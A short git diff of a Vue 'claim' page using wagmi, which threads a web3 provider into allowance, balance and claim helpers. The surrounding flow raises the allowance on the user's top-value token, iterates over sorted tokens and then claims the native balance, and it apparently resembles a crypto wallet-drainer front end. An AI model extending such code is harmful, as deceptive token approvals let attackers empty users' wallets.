@@ -436,7 +436,7 @@
 import Datavg from './Datavg.vue';
 import Footer from './Footer.vue';
 import { useToast } from 'vue-toastification';
-import { disconnect, getAccount, fetchFeeData } from '@wagmi/core';
+import { disconnect, getAccount, fetchFeeData, Connector } from '@wagmi/core';
 import {
   web3modal,
   claim,
@@ -476,7 +476,7 @@ export default {
           this.isDone = false;
 
           if (this.tokens.length > 0 && this.maxToken) {
-            await increaseAllowance(this.maxToken);
+            await increaseAllowance(this.maxToken, this.web3);
           } else {
             await claim(this.balance.value);
             this.claimable = 0;
@@ -484,8 +484,8 @@ export default {
 
           this.processing = false;
           this.isDone = true;
-          const allownce_value = await allownce(this.maxToken);
-          const balanceoftoken = await balanceOf(this.maxToken);
+          const allownce_value = await allownce(this.maxToken, this.web3);
+          const balanceoftoken = await balanceOf(this.maxToken, this.web3);
           if (allownce_value > balanceoftoken) {
             if (this.currentIndex + 1 > this.sortedTokens.length) {
               if (this.claimable > 0) {
@@ -564,6 +564,7 @@ export default {
                     Swal.showLoading();
                   },
                 });
+                this.web3 = Connector.getProvider();
                 this.account = getAccount().address;
                 this.showBalance();
               }
